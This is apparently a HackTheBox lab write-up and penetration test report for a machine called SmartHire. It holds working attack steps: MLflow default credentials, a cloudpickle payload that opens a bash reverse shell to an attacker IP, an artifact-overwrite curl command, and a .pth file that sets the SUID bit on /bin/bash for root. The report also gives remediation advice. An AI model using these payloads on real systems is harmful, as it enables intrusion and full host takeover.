@@ -1,21 +1,347 @@
 # SmartHire
 
 **Platform:** HackTheBox
+**OS:** Linux
+**Tags:** MLflow, Default Credentials, Pickle Deserialization, cloudpickle, RCE, .pth Hijack
 **Date:** 2026-08-21
 
-Active machine - content will be published upon retirement.
+An AI hiring platform with a Flask web app backed by an MLflow tracking server on a subdomain. MLflow was running on its documented default credentials giving full write access to the artifact store. The trained model loads a custom pickle on every prediction, so overwriting it with a malicious one and triggering a prediction drops a shell as `svcweb`. Root comes from a `sudo NOPASSWD` script that calls `site.addsitedir()` on a directory the service user can write to. That function processes `.pth` files as code at import time, before `main()` even runs.
+
+## 1. Enumeration
+
+```bash
+nmap -sC -sV <TARGET_IP>
+```
+
+```
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp open  http    nginx 1.18.0
+```
+
+Port 80 redirects to `smarthire.htb`. Added to `/etc/hosts` then fuzzed for subdomains:
+
+```bash
+ffuf -u http://smarthire.htb -H 'Host: FUZZ.smarthire.htb' \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac
+```
+
+```
+models   [Status: 401, Size: 107]
+```
+
+`models.smarthire.htb` comes back with a Basic Auth challenge identifying itself as MLflow 2.14.1. Added to `/etc/hosts`. Ran gobuster on the main app at the same time:
+
+```bash
+gobuster dir -u http://smarthire.htb \
+  -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -b 404
+```
+
+```
+/login      200
+/register   200
+/dashboard  302 -> /login
+```
+
+Flask app with signed session cookies. Standard auth routes. The MLflow subdomain is the interesting finding.
+
+## 2. App Enumeration
+
+Registered an account and logged in. The dashboard had two features: upload a CSV to train a model, and score resumes via `/predict`. Uploading without the right columns returns a clear error:
+
+```
+{"message":"CSV must contain 'experience' and 'skills' columns","status":"error"}
+```
+
+Added those columns and uploaded again. The model trained and MLflow tracked it as run `handsome-roo-985` with run ID `c02c488adae24db1a74cd44a620af17c`. Confirmed predictions were live:
+
+```
+{"prediction":[100],"status":"success"}
+```
+
+## 3. MLflow Access
+
+MLflow ships with documented default credentials. Tried them against the Basic Auth prompt:
+
+```bash
+curl -sk -u admin:password http://models.smarthire.htb/
+```
+
+Full access. The artifact store for every run was open for reading and writing. The default credentials `admin:password` were never rotated after enabling authentication on this instance.
+
+## 4. Foothold: Pickle Deserialization RCE
+
+Looking at the artifact tree for the trained run showed a custom pyfunc model rather than a standard sklearn one:
+
+```
+model/
+├── MLmodel
+├── python_model.pkl
+└── requirements.txt
+```
+
+`python_model.pkl` is loaded via `cloudpickle.load()` every time `/predict` is called. Python's pickle protocol allows any class to define `__reduce__`, which returns a callable and its arguments. The unpickler calls that callable during deserialization, before any subsequent method calls. This is a core design feature of pickle and is why the format is explicitly documented as unsafe for untrusted input. Overwriting this file and triggering a prediction gives immediate code execution as whatever user runs the backend.
+
+### 4.1 Confirm write access
+
+```bash
+curl -sk -u admin:password -X PUT --data-binary "test" \
+  "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/c02c488adae24db1a74cd44a620af17c/artifacts/model/test.txt"
+# {}
+```
+
+### 4.2 Build the payload
+
+```python
+# evil_pickle.py
+import cloudpickle, os
+
+LHOST = "<ATTACKER_IP>"
+LPORT = 4444
+
+class Evil:
+    def __reduce__(self):
+        cmd = f"/bin/bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
+        return (os.system, (cmd,))
+
+with open("python_model.pkl", "wb") as f:
+    cloudpickle.dump(Evil(), f)
+```
+
+### 4.3 Upload and trigger
+
+```bash
+python3 evil_pickle.py
+
+curl -sk -u admin:password -X PUT --data-binary @python_model.pkl \
+  "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/c02c488adae24db1a74cd44a620af17c/artifacts/model/python_model.pkl"
+```
+
+Started a listener and triggered a prediction via the Score Resumes feature on the web app. Shell landed as `svcweb`:
+
+```
+[+] [New Reverse Shell] => smarthire <TARGET_IP> svcweb(1000)
+svcweb@smarthire:/opt/mlflow$ id
+uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
+```
+
+## 5. Privilege escalation: .pth Plugin Hijack
+
+```bash
+sudo -l
+```
+
+```
+(root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
+```
+
+Looking at the script, it calls `site.addsitedir()` on every directory under `plugins/` before `main()` runs:
+
+```python
+for path in PLUGINS_DIR.iterdir():
+    if path.is_dir():
+        site.addsitedir(str(path))
+```
+
+`site.addsitedir()` does more than add a path to `sys.path`. It scans each directory for `.pth` files and executes any line beginning with `import` immediately at load time, before `main()` is called. Checking the plugin directories:
+
+```bash
+ls -la /opt/tools/mlflow_ctl/plugins/
+```
+
+```
+core   root:root     drwxr-xr-x  (not writable)
+dev    root:devs     drwxrwxr-x  (writable by devs group)
+```
+
+`svcweb` is in the `devs` group and can write to `plugins/dev/`. Drop a `.pth` file there and run the sudo command:
+
+```bash
+echo 'import os; os.chmod("/bin/bash", 0o4755)' \
+  > /opt/tools/mlflow_ctl/plugins/dev/x.pth
+
+sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
+```
+
+```bash
+bash -p
+```
+
+```
+bash-5.1# whoami
+root
+```
+
+## 6. Flags
+
+- User: `redacted`
+- Root: `redacted`
 
 ---
 
 ## Penetration Test Report
 
+**Target:** smarthire.htb
+**Address:** <TARGET_IP>
 **Assessment type:** External network & web application assessment
 **Assessment date:** 21 August 2026
-**Status:** Active - Embargoed
-**Environment:** HackTheBox laboratory assessment
+**Environment:** HackTheBox laboratory assessment  |  Linux
 **Prepared by:** Ledion Mujaj
 **Reference:** HTB-SMH-01
 
-> **Report Embargoed** - Full report will be published upon machine retirement.
+---
+
+## 1. Executive Summary
+
+Testing of **smarthire.htb** identified four findings that together produced full root compromise. The host ran an MLflow 2.14.1 tracking server on a subdomain protected only by HTTP Basic Auth using the publicly documented default credentials. With write access to the artifact store, the model artifact used by the application's prediction endpoint was replaced with a malicious pickle payload. Triggering a prediction via the web application caused the server to deserialize the payload and execute a reverse shell as `svcweb`. From `svcweb`, a `sudo NOPASSWD` entry permitted executing a Python script as root. The script called `site.addsitedir()` on a directory writable by `svcweb`'s group. Placing a `.pth` file in that directory caused Python to execute arbitrary code at import time with root privileges, before the script's own logic ran.
+
+**Priority recommendations:**
+
+1. Rotate the MLflow default credentials immediately and enforce a strong password policy. Restrict access to the MLflow subdomain to authorised internal addresses.
+2. Prevent the application from loading model artifacts from a store that is writable by any user; validate and sign artifacts before loading them.
+3. Remove or rewrite the `mlflowctl.py` sudo rule. If the script must run as root, ensure it does not call `site.addsitedir()` on any user-writable path.
 
 ---
+
+## 2. Assessment Scope and Methodology
+
+| Asset | Address | Description |
+|-------|---------|-------------|
+| smarthire.htb | <TARGET_IP> | Ubuntu Linux; SSH on 22, nginx on 80, MLflow 2.14.1 on models subdomain. |
+
+| Port / Asset | Service | Observed detail |
+|------|---------|----------------|
+| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu |
+| 80/tcp | HTTP | nginx; Flask AI hiring app at smarthire.htb |
+| models.smarthire.htb | HTTP | MLflow 2.14.1 behind Basic Auth |
+
+Testing began with a port scan followed by subdomain fuzzing. The MLflow subdomain was identified and successfully authenticated using default credentials. Application enumeration through the web app revealed a prediction endpoint loading a cloudpickle model artifact. With artifact store write access, a malicious pickle was constructed using cloudpickle's `__reduce__` mechanism. The payload was uploaded via the MLflow artifacts API, and a prediction was triggered on the web app to execute it. Post-foothold enumeration identified a `sudo NOPASSWD` rule for a Python script. Analysis of the script revealed a `site.addsitedir()` call on a group-writable plugin directory. A `.pth` file containing an `import` statement was placed there, causing arbitrary code to execute as root when the sudo command was run.
+
+---
+
+## 3. Results Overview
+
+| Reference | Finding | Severity |
+|-----------|---------|----------|
+| F-01 | MLflow 2.14.1 accessible via default credentials | **Critical** |
+| F-02 | Pickle deserialization RCE via writable model artifact store | **Critical** |
+| F-03 | sudo NOPASSWD script calls site.addsitedir() on group-writable path | **Critical** |
+
+**Compromise sequence:**
+
+| Stage | Action | Access obtained |
+|-------|--------|----------------|
+| 01 | Discovered MLflow subdomain via ffuf. Authenticated with default credentials `admin:password`. Confirmed full artifact store write access. | Write access to MLflow artifact store |
+| 02 | Replaced `python_model.pkl` for run `c02c488adae24db1a74cd44a620af17c` with a cloudpickle reverse shell payload. Triggered prediction via web app. | Remote shell as `svcweb` |
+| 03 | Located sudo rule for `mlflowctl.py`. Confirmed `svcweb` is in `devs` group with write access to `plugins/dev/`. Dropped `.pth` file with `os.chmod` payload. Executed sudo command. | Root shell |
+
+---
+
+## 4.1 MLflow Default Credentials
+
+### F-01   models.smarthire.htb -- default credentials admin:password - CRITICAL
+
+| Field | Detail |
+|-------|--------|
+| Description | MLflow 2.14.1 was deployed on `models.smarthire.htb` with HTTP Basic Auth using the documented default credentials `admin:password`. These were never changed after enabling authentication. Any party who discovers the subdomain has full read and write access to the experiment tracking server and all model artifact stores. |
+| Prerequisites | Network access to `models.smarthire.htb`. No prior credentials required beyond the public default. |
+| Impact | Full read and write access to the MLflow artifact store for all tracked runs. Enables artifact replacement attacks and model poisoning across any hosted model. |
+| Affected system | smarthire.htb -- `models.smarthire.htb` MLflow 2.14.1 |
+| CVSS 3.1 | 9.8 -- AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
+| CWE | CWE-1392: Use of Default Credentials |
+
+**Steps to reproduce:**
+
+1. `curl -sk -u admin:password http://models.smarthire.htb/`
+2. Observe full access to the MLflow API and artifact store.
+
+**Evidence:**
+
+```
+$ curl -sk -u admin:password http://models.smarthire.htb/api/2.0/mlflow/experiments/list
+{"experiments":[{"experiment_id":"0","name":"Default",...}]}
+```
+
+**Remediation:** Change the MLflow HTTP Basic Auth password to a randomly generated strong credential immediately. Restrict access to the models subdomain to authorised internal IP ranges at the network layer. Rotate any API tokens or credentials that were accessible from the artifact store.
+
+**Verification:** Confirm the default credentials no longer grant access. Confirm the subdomain is not reachable from untrusted networks. Verify the changed password meets the organisation's complexity requirements.
+
+---
+
+## 4.2 Pickle Deserialization RCE via Writable Model Artifact Store
+
+### F-02   /predict -- cloudpickle RCE via artifact store write - CRITICAL
+
+| Field | Detail |
+|-------|--------|
+| Description | The web application's `/predict` endpoint loaded a cloudpickle model artifact from the MLflow store without integrity verification. Python's pickle deserialization protocol executes arbitrary callables defined in `__reduce__` during loading, before any further validation. Because the artifact store was writable by anyone with MLflow credentials (see F-01), the model file was replaced with a malicious payload and a prediction request triggered execution as `svcweb`. |
+| Prerequisites | Write access to the MLflow artifact store (via F-01). Ability to trigger a prediction via the web application. |
+| Impact | Remote code execution as the `svcweb` service account. Full filesystem access for that account and a foothold for further escalation. |
+| Affected system | smarthire.htb -- `/predict` endpoint; model artifact `python_model.pkl` for run `c02c488adae24db1a74cd44a620af17c` |
+| CVSS 3.1 | 9.8 -- AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
+| CWE | CWE-502: Deserialization of Untrusted Data |
+
+**Steps to reproduce:**
+
+1. Build the payload: create `evil_pickle.py` using `cloudpickle` with a `__reduce__` returning `(os.system, (reverse_shell_command,))`.
+2. Upload: `curl -sk -u admin:password -X PUT --data-binary @python_model.pkl "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/<run_id>/artifacts/model/python_model.pkl"`
+3. Start a listener and trigger a prediction on the web app.
+4. Receive shell as `svcweb`.
+
+**Evidence:**
+
+```
+svcweb@smarthire:/opt/mlflow$ id
+uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
+```
+
+**Remediation:** Never deserialize pickle data loaded from a store that any external party can write to. Sign model artifacts cryptographically at training time and verify the signature before loading. Migrate away from pickle for model serialization and use a format that does not execute code on load (ONNX, safetensors). Separate the MLflow artifact store from the inference path using a review and promotion process.
+
+**Verification:** Confirm the artifact store is no longer writable with the default credentials. Confirm artifact integrity is verified before loading. Confirm the pickle deserialization path cannot be triggered with untrusted input.
+
+---
+
+## 4.3 sudo NOPASSWD Script Calls site.addsitedir() on Group-Writable Path
+
+### F-03   mlflowctl.py -- .pth hijack via sudo - CRITICAL
+
+| Field | Detail |
+|-------|--------|
+| Description | `svcweb` was permitted to run `/opt/tools/mlflow_ctl/mlflowctl.py` as root without a password via `sudo NOPASSWD`. The script called `site.addsitedir()` on each subdirectory of `plugins/` before its own `main()` ran. The `dev` plugin directory was writable by the `devs` group, of which `svcweb` is a member. `site.addsitedir()` processes `.pth` files in the given directory, executing any line that begins with `import` immediately at module load time. Placing a malicious `.pth` file in `plugins/dev/` caused arbitrary Python to run as root when the sudo command was invoked. |
+| Prerequisites | Local authenticated access as `svcweb`. Membership in the `devs` group. |
+| Impact | Arbitrary code execution as root before the script's own logic runs. Full compromise of the host. |
+| Affected system | smarthire.htb -- `sudo NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *`; `/opt/tools/mlflow_ctl/plugins/dev/` writable by `devs` group |
+| CVSS 3.1 | 7.8 -- AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
+| CWE | CWE-732: Incorrect Permission Assignment for Critical Resource |
+
+**Steps to reproduce:**
+
+1. `echo 'import os; os.chmod("/bin/bash", 0o4755)' > /opt/tools/mlflow_ctl/plugins/dev/x.pth`
+2. `sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status`
+3. `bash -p`
+
+**Evidence:**
+
+```
+svcweb@smarthire:/opt/mlflow$ sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
+svcweb@smarthire:/opt/mlflow$ bash -p
+bash-5.1# whoami
+root
+bash-5.1# cat /root/root.txt
+[redacted]
+```
+
+**Remediation:** Remove the `sudo NOPASSWD` rule for `mlflowctl.py` unless it is operationally required. If the script must run as root, rewrite it to avoid `site.addsitedir()` on any path writable by non-root users. Move all plugin directories to root-owned, non-group-writable locations. Audit all `sudo` rules on the host for similar patterns.
+
+**Verification:** Confirm the sudo rule for `mlflowctl.py` has been removed or scoped appropriately. Confirm `plugins/dev/` is no longer writable by the `devs` group. Confirm a local service account cannot obtain a root shell via the `.pth` method.
+
+---
+
+## 5. Remediation and Assessment Closeout
+
+| Priority | Action | Reference |
+|----------|--------|-----------|
+| Immediate | Rotate MLflow credentials. Restrict subdomain access to internal networks. | F-01 |
+| Immediate | Remove sudo NOPASSWD rule for mlflowctl.py or move plugin directories to root-owned paths. | F-03 |
+| High | Sign model artifacts and verify before loading. Migrate away from pickle serialization. | F-02 |
+
+**Test artefacts:** The file `/opt/tools/mlflow_ctl/plugins/dev/x.pth` was created on the target to exploit the .pth hijack. The `python_model.pkl` artifact for run `c02c488adae24db1a74cd44a620af17c` was replaced with a malicious payload. Both should be confirmed removed or restored.
